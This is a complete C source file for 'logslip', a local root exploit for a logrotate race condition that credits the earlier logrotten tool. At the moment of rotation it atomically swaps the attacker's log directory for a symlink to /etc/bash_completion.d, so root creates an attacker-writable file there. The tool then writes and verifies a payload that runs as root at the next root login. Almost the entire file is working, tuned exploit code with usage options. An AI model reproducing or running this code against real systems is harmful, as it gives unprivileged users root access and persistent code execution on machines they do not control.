/*
 * logslip - logrotate directory-swap race exploit
 *
 * Based on the race condition found and first weaponised by Wolfgang
 * Hotwagner in logrotten (https://github.com/whotwagner/logrotten).
 * The bug is his; the credit is his.  This is a rewrite aimed at a faster,
 * atomic swap and reliable payload delivery once the swap lands.
 *
 * The bug: logrotate, running as root, rotates a log the attacker owns with
 *
 *     rename("dir/access.log", "dir/access.log.1");
 *     ... a handful of microseconds ...
 *     createOutputFile("dir/access.log", O_CREAT|O_EXCL|O_NOFOLLOW);
 *
 * O_NOFOLLOW guards only the final component, so if the attacker replaces the
 * *directory* "dir" with a symlink to a root-owned directory in that gap, root
 * creates (and chowns, per the "create" directive) a file wherever the symlink
 * points.  Dropped into /etc/bash_completion.d, it runs as root on the next
 * interactive root login.
 *
 * What this rewrite does differently from logrotten:
 *
 *   - The swap is a single renameat2(RENAME_EXCHANGE) on a pre-opened parent
 *     fd, not rename()+symlink().  logrotten's two-syscall swap has its own
 *     window in which the log directory does not exist; lose there and you
 *     leave a dangling symlink that poisons every later attempt.  The exchange
 *     is atomic and trivially reversible, so the tree is always consistent.
 *
 *   - It busy-spins on a non-blocking inotify fd instead of blocking on
 *     read().  The rename->create gap is a couple of microseconds, shorter
 *     than a scheduler wakeup, so a reader that sleeps wakes after the create
 *     and loses; spinning reads the IN_MOVED_FROM essentially as root queues
 *     it, leaving just the one renameat2 between us and the create.
 *
 *   - It swaps back at once, then writes the payload to the now-stable target
 *     with a retry across root's create->fchown window, and reads it back to
 *     confirm.  No fixed -s sleep, no blind write, no silent exit: it reports
 *     win, loss, or precisely why it could not land.
 *
 *   - --probe reports the rotation mode (create / compress / copytruncate),
 *     the rotation period, and whether the recreated file is attacker-writable,
 *     so you aim correctly instead of guessing.
 *
 * Winning the rename->create gap is still probabilistic: it needs root
 * preempted inside those few microseconds, so run it with many attempts. The
 * gains here are a faster atomic reaction and reliable delivery once the swap
 * lands, not a different order of win rate. --decoys is an optional early-
 * warning lever (extra renames before the one that matters) that did not help
 * measurably under the busy-spin loop and defaults off.
 *
 * Build:  gcc -O2 -Wall -Wextra -o logslip logslip.c
 */

#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <getopt.h>
#include <limits.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/inotify.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#ifndef RENAME_EXCHANGE
#define RENAME_EXCHANGE (1 << 1)
#endif

#define DEFAULT_TARGET_DIRECTORY "/etc/bash_completion.d"
#define DEFAULT_ATTEMPTS 40
#define DEFAULT_CREATE_WAIT_MILLISECONDS 400
#define DEFAULT_DECOY_COUNT 0
#define ROTATION_WAIT_MILLISECONDS 11000
#define EVENT_BUFFER_LENGTH (32 * (sizeof(struct inotify_event) + NAME_MAX + 1))
#define PAYLOAD_LIMIT (1024 * 1024)

enum raceOutcome
{
    RACE_NO_ROTATION,
    RACE_SWAPPED,
    RACE_ERROR
};

static int parentDirectoryDescriptor = -1;
static char logDirectoryName[NAME_MAX + 1];
static char swapName[NAME_MAX + 1];
static volatile sig_atomic_t directoryIsSwapped;
static volatile sig_atomic_t interrupted;

static long exchangeDirectoryWithSwap(void)
{
    return syscall(SYS_renameat2,
                   parentDirectoryDescriptor, logDirectoryName,
                   parentDirectoryDescriptor, swapName,
                   RENAME_EXCHANGE);
}

/* Runs from a signal handler, so only async-signal-safe calls are allowed. */
static void restoreOnSignal(int signalNumber)
{
    (void)signalNumber;
    interrupted = 1;
    if (directoryIsSwapped)
    {
        exchangeDirectoryWithSwap();
        directoryIsSwapped = 0;
    }
    syscall(SYS_unlinkat, parentDirectoryDescriptor, swapName, 0);
    _exit(EXIT_FAILURE);
}

static long long millisecondsNow(void)
{
    struct timespec now;

    clock_gettime(CLOCK_MONOTONIC, &now);
    return ((long long)now.tv_sec * 1000) + (now.tv_nsec / 1000000);
}

static void pinToLastCpu(void)
{
    long cpuCount = sysconf(_SC_NPROCESSORS_ONLN);
    if (cpuCount < 2)
        return;

    cpu_set_t cpuSet;
    CPU_ZERO(&cpuSet);
    CPU_SET(cpuCount - 1, &cpuSet);
    sched_setaffinity(0, sizeof(cpuSet), &cpuSet);
}

static char *readWholeFile(const char *path, size_t *lengthOut)
{
    int fileDescriptor = open(path, O_RDONLY);
    if (fileDescriptor < 0)
        return NULL;

    char *buffer = malloc(PAYLOAD_LIMIT);
    if (!buffer)
    {
        close(fileDescriptor);
        return NULL;
    }

    ssize_t bytesRead = read(fileDescriptor, buffer, PAYLOAD_LIMIT);
    close(fileDescriptor);

    if (bytesRead <= 0)
    {
        free(buffer);
        return NULL;
    }

    *lengthOut = (size_t)bytesRead;
    return buffer;
}

static int writeAndVerifyPayload(const char *path, const char *payload, size_t payloadLength)
{
    int targetDescriptor = open(path, O_WRONLY | O_TRUNC);
    if (targetDescriptor < 0)
        return -1;

    size_t bytesWritten = 0;
    while (bytesWritten < payloadLength)
    {
        ssize_t written = write(targetDescriptor, payload + bytesWritten, payloadLength - bytesWritten);
        if (written <= 0)
        {
            close(targetDescriptor);
            return -1;
        }
        bytesWritten += (size_t)written;
    }
    close(targetDescriptor);

    char readback[256];
    int verifyDescriptor = open(path, O_RDONLY);
    if (verifyDescriptor < 0)
        return -1;

    ssize_t verifyBytes = read(verifyDescriptor, readback, sizeof(readback));
    close(verifyDescriptor);

    size_t compareLength = payloadLength < sizeof(readback) ? payloadLength : sizeof(readback);
    if (verifyBytes <= 0 || memcmp(readback, payload, compareLength) != 0)
        return -1;

    return 0;
}

static void appendTriggerLine(const char *logFile)
{
    int logDescriptor = open(logFile, O_WRONLY | O_APPEND);
    if (logDescriptor < 0)
        return;

    static const char line[] =
        "192.168.0.104 - - [29/Jun/2019:14:39:55 +0000] \"GET / HTTP/1.1\" 404 446 \"-\" \"logslip\"\n";
    ssize_t ignored = write(logDescriptor, line, sizeof(line) - 1);
    (void)ignored;
    close(logDescriptor);
}

static int nameIsBase(const char *eventName, const char *baseName, size_t baseNameLength)
{
    return strncmp(eventName, baseName, baseNameLength) == 0 && eventName[baseNameLength] == '\0';
}

static enum raceOutcome waitForRotationAndSwap(int inotifyDescriptor, const char *baseName)
{
    char eventBuffer[EVENT_BUFFER_LENGTH]
        __attribute__((aligned(__alignof__(struct inotify_event))));
    size_t baseNameLength = strlen(baseName);

    long long overallDeadline = millisecondsNow() + ROTATION_WAIT_MILLISECONDS;

    /*
     * Pure busy-spin on a non-blocking fd, never poll(). The window between
     * root's rename(log -> log.1) and create(log) is a couple of microseconds;
     * poll()'s wakeup latency alone is longer, so a sleeping reader always
     * reads the event after the create and loses. Spinning burns one pinned
     * core but reads the IN_MOVED_FROM essentially as root queues it, leaving
     * just a single renameat2 between us and the create.
     */
    while (!interrupted && millisecondsNow() < overallDeadline)
    {
        ssize_t bytesRead = read(inotifyDescriptor, eventBuffer, sizeof(eventBuffer));
        if (bytesRead <= 0)
            continue;

        for (char *cursor = eventBuffer; cursor < eventBuffer + bytesRead;)
        {
            struct inotify_event *event = (struct inotify_event *)cursor;
            cursor += sizeof(struct inotify_event) + event->len;

            if (!(event->mask & IN_MOVED_FROM) || event->len == 0)
                continue;

            if (nameIsBase(event->name, baseName, baseNameLength))
            {
                if (exchangeDirectoryWithSwap() != 0)
                    return RACE_ERROR;
                directoryIsSwapped = 1;
                return RACE_SWAPPED;
            }
        }
    }

    return RACE_NO_ROTATION;
}

static int probeRotation(const char *logFile, const char *logDirectoryPath,
                         const char *baseName, int shouldTrigger)
{
    int inotifyDescriptor = inotify_init1(0);
    if (inotifyDescriptor < 0)
    {
        fprintf(stderr, "probe: inotify_init1: %s\n", strerror(errno));
        return EXIT_FAILURE;
    }

    if (inotify_add_watch(inotifyDescriptor, logDirectoryPath,
                          IN_MOVED_FROM | IN_CREATE | IN_MODIFY | IN_DELETE) < 0)
    {
        fprintf(stderr, "probe: cannot watch %s: %s\n", logDirectoryPath, strerror(errno));
        close(inotifyDescriptor);
        return EXIT_FAILURE;
    }

    printf("[*] probing %s for one rotation (up to 60s)\n", logFile);
    if (shouldTrigger)
        appendTriggerLine(logFile);

    size_t baseNameLength = strlen(baseName);
    int sawBaseMoved = 0;
    int sawBaseCreated = 0;
    int sawBaseModifiedToEmpty = 0;
    int sawCompressed = 0;
    long long firstEventTime = 0;
    long long lastEventTime = 0;

    char eventBuffer[EVENT_BUFFER_LENGTH]
        __attribute__((aligned(__alignof__(struct inotify_event))));

    struct pollfd pollDescriptor;
    pollDescriptor.fd = inotifyDescriptor;
    pollDescriptor.events = POLLIN;

    long long deadline = millisecondsNow() + 60000;
    while (millisecondsNow() < deadline && !sawBaseCreated && !sawCompressed)
    {
        long long remaining = deadline - millisecondsNow();
        if (poll(&pollDescriptor, 1, (int)remaining) <= 0)
            break;

        ssize_t bytesRead = read(inotifyDescriptor, eventBuffer, sizeof(eventBuffer));
        if (bytesRead <= 0)
            continue;

        for (char *cursor = eventBuffer; cursor < eventBuffer + bytesRead;)
        {
            struct inotify_event *event = (struct inotify_event *)cursor;
            cursor += sizeof(struct inotify_event) + event->len;
            if (event->len == 0)
                continue;

            if (firstEventTime == 0)
                firstEventTime = millisecondsNow();
            lastEventTime = millisecondsNow();

            size_t nameLength = strlen(event->name);
            int endsWithGz = nameLength > 3 && strcmp(event->name + nameLength - 3, ".gz") == 0;

            if ((event->mask & IN_MOVED_FROM) && nameIsBase(event->name, baseName, baseNameLength))
                sawBaseMoved = 1;
            if ((event->mask & IN_CREATE) && nameIsBase(event->name, baseName, baseNameLength))
                sawBaseCreated = 1;
            if ((event->mask & IN_MODIFY) && nameIsBase(event->name, baseName, baseNameLength))
                sawBaseModifiedToEmpty = 1;
            if ((event->mask & IN_CREATE) && endsWithGz)
                sawCompressed = 1;
        }
    }

    close(inotifyDescriptor);

    printf("\n=== probe result ===\n");
    const char *mode;
    const char *advice;
    if (sawCompressed)
    {
        mode = "compress";
        advice = "pass the rotated name (<logfile>.1); -p does NOT deliver here, it is an arbitrary .gz write";
    }
    else if (sawBaseMoved && sawBaseCreated)
    {
        mode = "create (rename + recreate)";
        advice = "default mode is correct: logslip -p <payload> <logfile>";
    }
    else if (sawBaseModifiedToEmpty && !sawBaseMoved)
    {
        mode = "copytruncate";
        advice = "no rename happens; the directory swap race does not apply to this path";
    }
    else
    {
        mode = "no rotation observed";
        advice = "write to the log and/or wait for root's timer, or raise the trigger";
    }

    printf("mode      : %s\n", mode);
    if (firstEventTime && lastEventTime)
        printf("rotation span: %lld ms of activity\n", lastEventTime - firstEventTime);

    struct stat recreatedStat;
    char recreatedPath[2 * PATH_MAX];
    snprintf(recreatedPath, sizeof(recreatedPath), "%s/%s", logDirectoryPath, baseName);
    if (stat(recreatedPath, &recreatedStat) == 0)
    {
        int writable = recreatedStat.st_uid == getuid();
        printf("recreated %s: owner uid=%u mode=%03o -> %s\n",
               baseName, recreatedStat.st_uid, recreatedStat.st_mode & 07777,
               writable ? "ATTACKER-WRITABLE (payload will land)"
                        : "root-owned (won race still yields EACCES on write)");
    }

    printf("advice    : %s\n", advice);
    return EXIT_SUCCESS;
}

static void usage(const char *programName)
{
    printf("logslip - logrotate directory-swap race exploit\n");
    printf("  (based on Wolfgang Hotwagner's logrotten)\n\n");
    printf("usage: %s [OPTION...] <logfile>\n", programName);
    printf("  -p, --payload <file>    file whose contents are dropped as root\n");
    printf("  -t, --targetdir <dir>   directory to hijack (default %s)\n", DEFAULT_TARGET_DIRECTORY);
    printf("  -a, --attempts <n>      attempts before giving up, 0 = forever (default %d)\n", DEFAULT_ATTEMPTS);
    printf("  -d, --decoys <n>        optional early-warning decoy rotated files (default %d)\n", DEFAULT_DECOY_COUNT);
    printf("  -T, --trigger           append to the log each attempt to force a rotation\n");
    printf("  -w, --wait <ms>         window to wait for root's create (default %d)\n", DEFAULT_CREATE_WAIT_MILLISECONDS);
    printf("      --probe             detect rotation mode/period/writability and exit\n");
    printf("  -q, --quiet             only print the outcome\n");
    printf("  -h, --help              this help\n");
}

int main(int argc, char *argv[])
{
    setvbuf(stdout, NULL, _IOLBF, 0);

    const char *payloadFile = NULL;
    const char *targetDirectory = DEFAULT_TARGET_DIRECTORY;
    int maximumAttempts = DEFAULT_ATTEMPTS;
    int decoyCount = DEFAULT_DECOY_COUNT;
    int shouldTrigger = 0;
    int createWaitMilliseconds = DEFAULT_CREATE_WAIT_MILLISECONDS;
    int quiet = 0;
    int probeMode = 0;

    enum { OPTION_PROBE = 256 };
    static struct option longOptions[] = {
        {"payload", required_argument, 0, 'p'},
        {"targetdir", required_argument, 0, 't'},
        {"attempts", required_argument, 0, 'a'},
        {"decoys", required_argument, 0, 'd'},
        {"trigger", no_argument, 0, 'T'},
        {"wait", required_argument, 0, 'w'},
        {"probe", no_argument, 0, OPTION_PROBE},
        {"quiet", no_argument, 0, 'q'},
        {"help", no_argument, 0, 'h'},
        {0, 0, 0, 0}};

    int option;
    while ((option = getopt_long(argc, argv, "p:t:a:d:Tw:qh", longOptions, NULL)) != -1)
    {
        switch (option)
        {
        case 'p': payloadFile = optarg; break;
        case 't': targetDirectory = optarg; break;
        case 'a': maximumAttempts = atoi(optarg); break;
        case 'd': decoyCount = atoi(optarg); break;
        case 'T': shouldTrigger = 1; break;
        case 'w': createWaitMilliseconds = atoi(optarg); break;
        case 'q': quiet = 1; break;
        case OPTION_PROBE: probeMode = 1; break;
        case 'h': usage(argv[0]); return EXIT_SUCCESS;
        default: usage(argv[0]); return EXIT_FAILURE;
        }
    }

    if (optind >= argc)
    {
        usage(argv[0]);
        return EXIT_FAILURE;
    }

    const char *logFile = argv[optind];
    if (logFile[0] != '/')
    {
        fprintf(stderr, "error: give an absolute path to the logfile\n");
        return EXIT_FAILURE;
    }

    char logFileCopy[PATH_MAX];
    if (snprintf(logFileCopy, sizeof(logFileCopy), "%s", logFile) >= (int)sizeof(logFileCopy))
    {
        fprintf(stderr, "error: logfile path too long\n");
        return EXIT_FAILURE;
    }

    char *lastSlash = strrchr(logFileCopy, '/');
    *lastSlash = '\0';
    const char *logDirectoryPath = logFileCopy[0] ? logFileCopy : "/";
    const char *baseName = lastSlash + 1;

    if (baseName[0] == '\0')
    {
        fprintf(stderr, "error: logfile path must not end in '/'\n");
        return EXIT_FAILURE;
    }

    if (probeMode)
        return probeRotation(logFile, logDirectoryPath, baseName, shouldTrigger);

    char parentDirectoryPath[PATH_MAX];
    snprintf(parentDirectoryPath, sizeof(parentDirectoryPath), "%s", logDirectoryPath);
    char *logDirectorySlash = strrchr(parentDirectoryPath, '/');
    if (!logDirectorySlash || logDirectorySlash == parentDirectoryPath)
    {
        fprintf(stderr, "error: the log directory must not be at the filesystem root\n");
        return EXIT_FAILURE;
    }
    *logDirectorySlash = '\0';

    if (snprintf(logDirectoryName, sizeof(logDirectoryName), "%s", logDirectorySlash + 1) >= (int)sizeof(logDirectoryName) ||
        snprintf(swapName, sizeof(swapName), "%s.swap", logDirectorySlash + 1) >= (int)sizeof(swapName))
    {
        fprintf(stderr, "error: log directory name too long\n");
        return EXIT_FAILURE;
    }

    char targetPath[PATH_MAX];
    snprintf(targetPath, sizeof(targetPath), "%s/%s", targetDirectory, baseName);

    size_t payloadLength = 0;
    char *payload = NULL;
    if (payloadFile)
    {
        payload = readWholeFile(payloadFile, &payloadLength);
        if (!payload)
        {
            fprintf(stderr, "error: cannot read payload %s: %s\n", payloadFile, strerror(errno));
            return EXIT_FAILURE;
        }
    }

    struct stat targetDirectoryStat;
    if (stat(targetDirectory, &targetDirectoryStat) != 0)
        fprintf(stderr, "warning: target %s not statable now: %s\n", targetDirectory, strerror(errno));

    parentDirectoryDescriptor = open(parentDirectoryPath, O_RDONLY | O_DIRECTORY);
    if (parentDirectoryDescriptor < 0)
    {
        fprintf(stderr, "error: cannot open parent %s: %s\n", parentDirectoryPath, strerror(errno));
        free(payload);
        return EXIT_FAILURE;
    }

    unlinkat(parentDirectoryDescriptor, swapName, 0);
    if (symlinkat(targetDirectory, parentDirectoryDescriptor, swapName) != 0)
    {
        fprintf(stderr, "error: cannot create swap symlink: %s\n", strerror(errno));
        close(parentDirectoryDescriptor);
        free(payload);
        return EXIT_FAILURE;
    }

    for (int decoyIndex = 1; decoyIndex <= decoyCount; decoyIndex++)
    {
        char decoyPath[2 * PATH_MAX];
        snprintf(decoyPath, sizeof(decoyPath), "%s/%s.%d", logDirectoryPath, baseName, decoyIndex);
        int decoyDescriptor = open(decoyPath, O_WRONLY | O_CREAT, 0644);
        if (decoyDescriptor >= 0)
            close(decoyDescriptor);
    }

    struct sigaction action;
    memset(&action, 0, sizeof(action));
    action.sa_handler = restoreOnSignal;
    sigaction(SIGINT, &action, NULL);
    sigaction(SIGTERM, &action, NULL);

    pinToLastCpu();

    int inotifyDescriptor = inotify_init1(IN_NONBLOCK);
    if (inotifyDescriptor < 0)
    {
        fprintf(stderr, "error: inotify_init1: %s\n", strerror(errno));
        unlinkat(parentDirectoryDescriptor, swapName, 0);
        close(parentDirectoryDescriptor);
        free(payload);
        return EXIT_FAILURE;
    }

    int watchDescriptor = inotify_add_watch(inotifyDescriptor, logDirectoryPath, IN_MOVED_FROM);
    if (watchDescriptor < 0)
    {
        fprintf(stderr, "error: cannot watch %s: %s\n", logDirectoryPath, strerror(errno));
        close(inotifyDescriptor);
        unlinkat(parentDirectoryDescriptor, swapName, 0);
        close(parentDirectoryDescriptor);
        free(payload);
        return EXIT_FAILURE;
    }

    if (!quiet)
    {
        printf("[*] target log   %s\n", logFile);
        printf("[*] hijacking    %s -> %s\n", logDirectoryPath, targetDirectory);
        printf("[*] drop path    %s\n", targetPath);
        printf("[*] payload      %s\n", payloadFile ? payloadFile : "(none, swap only)");
        printf("[*] decoys       %d, %s trigger\n", decoyCount, shouldTrigger ? "with" : "no");
    }

    int attempt = 0;
    int won = 0;
    const char *lossReason = "no rotation seen";

    while (!interrupted && !won && (maximumAttempts == 0 || attempt < maximumAttempts))
    {
        attempt++;

        if (shouldTrigger)
            appendTriggerLine(logFile);

        enum raceOutcome outcome = waitForRotationAndSwap(inotifyDescriptor, baseName);
        if (outcome == RACE_ERROR)
        {
            fprintf(stderr, "error: renameat2(RENAME_EXCHANGE): %s\n", strerror(errno));
            break;
        }
        if (outcome == RACE_NO_ROTATION)
        {
            if (!quiet)
                printf("[-] attempt %d: no rotation within window\n", attempt);
            continue;
        }

        /*
         * Directory is swapped. Poll briefly for root to create the file
         * through the symlink, then swap back at once: the target path is
         * absolute and outlives the swap, so the payload write does not need
         * the hold. Minimising the hold keeps root's next rotation from
         * landing inside the hijacked directory.
         */
        long long createDeadline = millisecondsNow() + createWaitMilliseconds;
        int landed = 0;
        while (millisecondsNow() < createDeadline)
        {
            if (access(targetPath, F_OK) == 0)
            {
                landed = 1;
                break;
            }
        }

        exchangeDirectoryWithSwap();
        directoryIsSwapped = 0;

        if (!landed)
        {
            lossReason = "root resolved the path before the swap (lost race)";
        }
        else if (!payload)
        {
            won = 1;
        }
        else
        {
            /*
             * Root creates the file then fchown()s it to us; retry the write
             * across that brief window rather than lose a won race to it.
             */
            long long writeDeadline = millisecondsNow() + 300;
            while (millisecondsNow() < writeDeadline)
            {
                if (writeAndVerifyPayload(targetPath, payload, payloadLength) == 0)
                {
                    won = 1;
                    break;
                }
            }
            if (!won)
                lossReason = "file created but not attacker-writable (check create directive)";
        }

        if (won && !quiet)
            printf("[+] attempt %d: won the swap, payload written\n", attempt);
        if (!won && !quiet)
            printf("[-] attempt %d: %s\n", attempt, lossReason);
    }

    inotify_rm_watch(inotifyDescriptor, watchDescriptor);
    close(inotifyDescriptor);

    for (int decoyIndex = 1; decoyIndex <= decoyCount; decoyIndex++)
    {
        char decoyPath[2 * PATH_MAX];
        snprintf(decoyPath, sizeof(decoyPath), "%s/%s.%d", logDirectoryPath, baseName, decoyIndex);
        unlink(decoyPath);
    }
    unlinkat(parentDirectoryDescriptor, swapName, 0);
    close(parentDirectoryDescriptor);
    free(payload);

    if (won)
    {
        printf("[+] WON on attempt %d - dropped %zu bytes to %s\n", attempt, payloadLength, targetPath);
        return EXIT_SUCCESS;
    }

    printf("[!] gave up after %d attempt(s): %s\n", attempt, lossReason);
    return EXIT_FAILURE;
}
